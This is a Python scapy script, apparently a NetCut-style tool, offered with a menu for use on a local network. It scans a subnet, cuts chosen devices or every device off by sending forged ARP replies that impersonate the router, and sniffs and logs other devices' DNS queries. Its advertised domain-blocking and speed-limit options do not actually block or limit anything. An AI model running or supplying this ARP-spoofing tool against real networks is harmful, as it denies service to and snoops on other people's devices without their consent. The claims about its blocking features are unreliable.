# Copyright (c) 2024 Ryan Ben Hassine (Ryanbenhassine.com)
# All rights reserved.
#
# This script is provided for educational and ethical use only.
#
# If you use or modify this code, please retain this copyright notice.

from scapy.all import ARP, Ether, srp, sendp, sniff, DNSQR
import threading
import time
import socket
import subprocess
import re
import fcntl
import struct
import platform
import os
import sys

target_range = "192.168.1.0/24"
router_ip = "192.168.1.1"
own_ip = "192.168.1.2"  # Replace with your IP
iface = "en0"

blocked = {}
blocked_ips = set()

# Minimalist color helper
class Color:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    GREY = '\033[90m'
    WHITE = '\033[97m'
    BLACK = '\033[30m'
    BG_GREY = '\033[100m'
    BG_WHITE = '\033[107m'
    BG_BLACK = '\033[40m'
    BG_BLUE = '\033[44m'
    BG_GREEN = '\033[42m'
    BG_CYAN = '\033[46m'
    BG_YELLOW = '\033[43m'
    BG_RED = '\033[41m'
    BG_MAGENTA = '\033[45m'
    BG_RESET = '\033[49m'

def colorize(text, color):
    return f"{color}{text}{Color.ENDC}"

# Configurable blocked domains (edit here or via menu)
BLOCKED_DOMAINS_RAW = [
    "tiktok.com",
    "instagram.com",
    "facebook.com",
]

# Configurable video-blocked domains (edit here or via menu)
VIDEO_BLOCKED_DOMAINS_RAW = [
    "video-cdn.tiktok.com",
    "video.xx.fbcdn.net",
    "scontent.cdninstagram.com",
    # Add more known video CDN subdomains as needed
]

def compile_domain_patterns(domains):
    return [re.compile(rf".*{re.escape(domain)}$", re.IGNORECASE) for domain in domains]

BLOCKED_DOMAINS = compile_domain_patterns(BLOCKED_DOMAINS_RAW)
VIDEO_BLOCKED_DOMAINS = compile_domain_patterns(VIDEO_BLOCKED_DOMAINS_RAW)

# Per-device domain block: {ip: set(domains)}
device_domain_blocks = {}  # e.g. {'192.168.1.5': {'tiktok.com', 'facebook.com'}}
# Per-device video domain block: {ip: set(domains)}
device_video_domain_blocks = {}  # e.g. {'192.168.1.5': {'video-cdn.tiktok.com'}}

# DNS log buffer and toggle
dns_log_buffer = []
dns_log_enabled = False

def is_blocked_domain(qname, ip=None):
    # Check global block
    for pattern in BLOCKED_DOMAINS:
        if pattern.match(qname):
            return True
    # Check per-device block
    if ip and ip in device_domain_blocks:
        for domain in device_domain_blocks[ip]:
            if qname.endswith(domain):
                return True
    return False

def is_video_blocked_domain(qname, ip=None):
    # Check global video block
    for pattern in VIDEO_BLOCKED_DOMAINS:
        if pattern.match(qname):
            return True
    # Check per-device video block
    if ip and ip in device_video_domain_blocks:
        for domain in device_video_domain_blocks[ip]:
            if qname.endswith(domain):
                return True
    return False

def scan():
    arp = ARP(pdst=target_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    result = srp(ether/arp, timeout=2, iface=iface, verbose=0)[0]
    return [{'ip': rcv.psrc, 'mac': rcv.hwsrc} for snd, rcv in result]

def get_hostname(ip):
    try:
        # Try to resolve hostname every time for best effort
        return socket.gethostbyaddr(ip)[0]
    except Exception:
        return "Unknown"

def block(ip, mac):
    spoof = ARP(op=2, pdst=ip, hwdst=mac, psrc=router_ip)
    pkt = Ether(dst=mac)/spoof
    while ip in blocked:
        sendp(pkt, verbose=0, iface=iface)
        time.sleep(2)

def start_block(ip, mac):
    if ip in (router_ip, own_ip):
        print(f"Skipping block for {ip} (router or own IP)")
        return
    if ip not in blocked:
        blocked[ip] = True
        blocked_ips.add(ip)
        t = threading.Thread(target=block, args=(ip, mac), daemon=True)
        t.start()

def unblock(ip):
    if ip in blocked:
        del blocked[ip]
        blocked_ips.discard(ip)

def unblock_all():
    blocked.clear()
    blocked_ips.clear()
    print("All devices unblocked.")

def block_all(devices):
    for d in devices:
        if d['ip'] not in (router_ip, own_ip):
            start_block(d['ip'], d['mac'])
    print("All devices blocked.")

speed_limit_kbps = None  # global speed limit value

def apply_speed_limit(limit_kbps):
    global speed_limit_kbps
    speed_limit_kbps = limit_kbps
    # macOS speed limiting is complex; this is a placeholder.
    # On Linux, you could use `tc` commands with subprocess here.
    print(f"Speed limit set to {limit_kbps} kbps (NOTE: Not implemented on macOS)")

def dns_sniffer(packet):
    if packet.haslayer(DNSQR):
        src_ip = packet[0][1].src
        qname = packet[DNSQR].qname.decode().rstrip('.')
        blocked_domain = is_blocked_domain(qname, src_ip)
        video_blocked_domain = is_video_blocked_domain(qname, src_ip)
        if src_ip in blocked_ips or blocked_domain or video_blocked_domain:
            log_entry = f"[DNS][{src_ip}] Query: {qname}"
            if blocked_domain:
                log_entry += colorize(" [BLOCKED]", Color.FAIL)
            if video_blocked_domain:
                log_entry += colorize(" [VIDEO BLOCKED]", Color.WARNING)
            if dns_log_enabled:
                print(colorize(log_entry, Color.WARNING if (blocked_domain or video_blocked_domain) else Color.OKCYAN))
            dns_log_buffer.append(log_entry)
            if blocked_domain or video_blocked_domain:
                return

def start_dns_logger():
    t = threading.Thread(target=lambda: sniff(filter="udp port 53", prn=dns_sniffer, store=0, iface=iface), daemon=True)
    t.start()

def menu():
    start_dns_logger()
    global dns_log_enabled, BLOCKED_DOMAINS_RAW, BLOCKED_DOMAINS, VIDEO_BLOCKED_DOMAINS_RAW, VIDEO_BLOCKED_DOMAINS
    while True:
        devices = scan()
        visible_devices = [d for d in devices if d['ip'] not in (router_ip, own_ip)]

        print(colorize("\nDevices on the network:", Color.BOLD + Color.OKBLUE))
        if not visible_devices:
            print(colorize("No visible devices found (all blocked or own/router IP).", Color.GREY))
        else:
            for i, d in enumerate(visible_devices):
                name = get_hostname(d['ip'])
                status = colorize("[Blocked]", Color.FAIL) if d['ip'] in blocked else colorize("[Allowed]", Color.OKCYAN)
                doms = device_domain_blocks.get(d['ip'])
                doms_str = f" Domains: {', '.join(doms)}" if doms else ""
                vdoms = device_video_domain_blocks.get(d['ip'])
                vdoms_str = f" VideoDomains: {', '.join(vdoms)}" if vdoms else ""
                print(f"{colorize(f'[{i}]', Color.OKGREEN)} {d['ip']} - {d['mac']} - {name} {status}{doms_str}{vdoms_str}")

        print(colorize("\nOptions:", Color.BOLD + Color.OKBLUE))
        print(f"{colorize('1.', Color.OKGREEN)} Block device")
        print(f"{colorize('2.', Color.OKGREEN)} Unblock device")
        print(f"{colorize('3.', Color.OKGREEN)} Unblock ALL devices")
        print(f"{colorize('4.', Color.OKGREEN)} Block ALL devices")
        print(f"{colorize('5.', Color.OKGREEN)} Apply speed limit to all devices")
        print(f"{colorize('6.', Color.OKGREEN)} Show DNS queries from blocked/selected domains")
        print(f"{colorize('7.', Color.OKGREEN)} Toggle DNS log display (currently {'ON' if dns_log_enabled else 'OFF'})")
        print(f"{colorize('8.', Color.OKGREEN)} Manage blocked domains (global)")
        print(f"{colorize('9.', Color.OKGREEN)} Apply domain block to device")
        print(f"{colorize('10.', Color.OKGREEN)} Apply domain block to ALL devices")
        print(f"{colorize('11.', Color.WARNING)} Manage video-blocked domains (global)")
        print(f"{colorize('12.', Color.WARNING)} Apply video domain block to device")
        print(f"{colorize('13.', Color.WARNING)} Apply video domain block to ALL devices")
        print(f"{colorize('14.', Color.OKGREEN)} Refresh list")
        print(f"{colorize('15.', Color.FAIL)} Exit")

        choice = input(colorize("Select option: ", Color.BOLD))

        if choice == '1':
            allowed_devices = [d for d in visible_devices if d['ip'] not in blocked]
            if not allowed_devices:
                print(colorize("No devices to block.", Color.WARNING))
                continue
            for i, d in enumerate(allowed_devices):
                name = get_hostname(d['ip'])
                print(f"{colorize(f'[{i}]', Color.OKGREEN)} {d['ip']} - {d['mac']} - {name}")
            idx = int(input("Device index to block: "))
            if idx < 0 or idx >= len(allowed_devices):
                print(colorize("Invalid index.", Color.FAIL))
                continue
            d = allowed_devices[idx]
            start_block(d['ip'], d['mac'])
            print(colorize(f"Started blocking {d['ip']}", Color.WARNING))

        elif choice == '2':
            blocked_devices = [d for d in visible_devices if d['ip'] in blocked]
            if not blocked_devices:
                print(colorize("No blocked devices.", Color.GREY))
                continue
            for i, d in enumerate(blocked_devices):
                name = get_hostname(d['ip'])
                print(f"{colorize(f'[{i}]', Color.FAIL)} {d['ip']} - {d['mac']} - {name}")
            idx = int(input("Device index to unblock: "))
            if idx < 0 or idx >= len(blocked_devices):
                print(colorize("Invalid index.", Color.FAIL))
                continue
            d = blocked_devices[idx]
            unblock(d['ip'])
            print(colorize(f"Unblocked {d['ip']}", Color.OKGREEN))

        elif choice == '3':
            unblock_all()

        elif choice == '4':
            block_all(devices)

        elif choice == '5':
            kbps = input("Enter speed limit in kbps (example 500): ")
            try:
                kbps_val = int(kbps)
                apply_speed_limit(kbps_val)
            except ValueError:
                print(colorize("Invalid number.", Color.FAIL))

        elif choice == '6':
            print(colorize("\n--- DNS Query Log (blocked/selected domains) ---", Color.BOLD + Color.OKBLUE))
            if not dns_log_buffer:
                print(colorize("No DNS queries logged yet.", Color.GREY))
            else:
                for entry in dns_log_buffer[-30:]:
                    print(entry)
            print(colorize("--- End of DNS Log ---\n", Color.BOLD + Color.OKBLUE))
            input(colorize("Press Enter to continue.", Color.GREY))

        elif choice == '7':
            dns_log_enabled = not dns_log_enabled
            print(colorize(f"DNS log display is now {'ON' if dns_log_enabled else 'OFF'}.", Color.OKCYAN))

        elif choice == '8':
            print(colorize("\nCurrent blocked domains:", Color.BOLD + Color.OKBLUE))
            for i, dom in enumerate(BLOCKED_DOMAINS_RAW):
                print(f"{colorize(f'[{i}]', Color.OKGREEN)} {dom}")
            print(colorize("a. Add domain", Color.OKGREEN))
            print(colorize("r. Remove domain", Color.OKGREEN))
            print(colorize("b. Back", Color.GREY))
            sub = input("Select: ").strip().lower()
            if sub == 'a':
                new_dom = input("Enter domain to block (e.g. youtube.com): ").strip().lower()
                if new_dom and new_dom not in BLOCKED_DOMAINS_RAW:
                    BLOCKED_DOMAINS_RAW.append(new_dom)
                    BLOCKED_DOMAINS = compile_domain_patterns(BLOCKED_DOMAINS_RAW)
                    print(colorize(f"Added {new_dom} to blocked domains.", Color.OKGREEN))
            elif sub == 'r':
                idx = int(input("Domain index to remove: "))
                if 0 <= idx < len(BLOCKED_DOMAINS_RAW):
                    removed = BLOCKED_DOMAINS_RAW.pop(idx)
                    BLOCKED_DOMAINS = compile_domain_patterns(BLOCKED_DOMAINS_RAW)
                    print(colorize(f"Removed {removed} from blocked domains.", Color.WARNING))
            elif sub == 'b':
                pass

        elif choice == '9':
            # Apply domain block to a selected device
            for i, d in enumerate(visible_devices):
                name = get_hostname(d['ip'])
                print(f"{colorize(f'[{i}]', Color.OKGREEN)} {d['ip']} - {d['mac']} - {name}")
            idx = int(input("Device index to apply domain block: "))
            if idx < 0 or idx >= len(visible_devices):
                print(colorize("Invalid index.", Color.FAIL))
                continue
            d = visible_devices[idx]
            dom = input("Enter domain to block for this device (e.g. youtube.com): ").strip().lower()
            if dom:
                device_domain_blocks.setdefault(d['ip'], set()).add(dom)
                print(colorize(f"Blocked {dom} for {d['ip']}", Color.OKGREEN))

        elif choice == '10':
            dom = input("Enter domain to block for ALL devices (e.g. youtube.com): ").strip().lower()
            if dom:
                for d in visible_devices:
                    device_domain_blocks.setdefault(d['ip'], set()).add(dom)
                print(colorize(f"Blocked {dom} for all devices.", Color.OKGREEN))

        elif choice == '11':
            print(colorize("\nCurrent video-blocked domains:", Color.BOLD + Color.OKBLUE))
            for i, dom in enumerate(VIDEO_BLOCKED_DOMAINS_RAW):
                print(f"{colorize(f'[{i}]', Color.WARNING)} {dom}")
            print(colorize("a. Add video domain", Color.OKGREEN))
            print(colorize("r. Remove video domain", Color.OKGREEN))
            print(colorize("b. Back", Color.GREY))
            sub = input("Select: ").strip().lower()
            if sub == 'a':
                new_dom = input("Enter video domain to block (e.g. video-cdn.tiktok.com): ").strip().lower()
                if new_dom and new_dom not in VIDEO_BLOCKED_DOMAINS_RAW:
                    VIDEO_BLOCKED_DOMAINS_RAW.append(new_dom)
                    VIDEO_BLOCKED_DOMAINS = compile_domain_patterns(VIDEO_BLOCKED_DOMAINS_RAW)
                    print(colorize(f"Added {new_dom} to video-blocked domains.", Color.OKGREEN))
            elif sub == 'r':
                idx = int(input("Video domain index to remove: "))
                if 0 <= idx < len(VIDEO_BLOCKED_DOMAINS_RAW):
                    removed = VIDEO_BLOCKED_DOMAINS_RAW.pop(idx)
                    VIDEO_BLOCKED_DOMAINS = compile_domain_patterns(VIDEO_BLOCKED_DOMAINS_RAW)
                    print(colorize(f"Removed {removed} from video-blocked domains.", Color.WARNING))
            elif sub == 'b':
                pass
        elif choice == '12':
            for i, d in enumerate(visible_devices):
                name = get_hostname(d['ip'])
                print(f"{colorize(f'[{i}]', Color.OKGREEN)} {d['ip']} - {d['mac']} - {name}")
            idx = int(input("Device index to apply video domain block: "))
            if idx < 0 or idx >= len(visible_devices):
                print(colorize("Invalid index.", Color.FAIL))
                continue
            d = visible_devices[idx]
            vdom = input("Enter video domain to block for this device (e.g. video-cdn.tiktok.com): ").strip().lower()
            if vdom:
                device_video_domain_blocks.setdefault(d['ip'], set()).add(vdom)
                print(colorize(f"Blocked {vdom} for {d['ip']}", Color.OKGREEN))
        elif choice == '13':
            vdom = input("Enter video domain to block for ALL devices (e.g. video-cdn.tiktok.com): ").strip().lower()
            if vdom:
                for d in visible_devices:
                    device_video_domain_blocks.setdefault(d['ip'], set()).add(vdom)
                print(colorize(f"Blocked {vdom} for all devices.", Color.OKGREEN))
        elif choice == '14':
            continue
        elif choice == '15':
            print(colorize("Exiting...", Color.GREY))
            break

        else:
            print(colorize("Invalid option.", Color.FAIL))

if __name__ == "__main__":
    menu()